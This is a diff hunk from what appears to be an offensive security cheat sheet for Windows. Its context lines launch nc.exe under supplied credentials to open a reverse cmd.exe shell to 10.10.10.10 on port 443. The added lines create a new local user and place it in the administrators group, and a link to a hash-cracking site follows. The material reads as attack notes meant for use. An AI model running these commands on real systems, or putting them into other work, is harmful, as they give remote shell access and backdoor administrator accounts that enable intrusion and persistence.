@@ -78,6 +78,10 @@ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword  
 Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nv","10.10.10.10","443","-e","cmd.exe") -WorkingDirectory C:\Users\Public  
 
+PSAddAdminUser  
+net user /add [*username] [password]  
+net localgroup administrators [username] /add  
+
 Hashes decrypt:
 --------------------------------------------------
 https://cmd5.ru/  
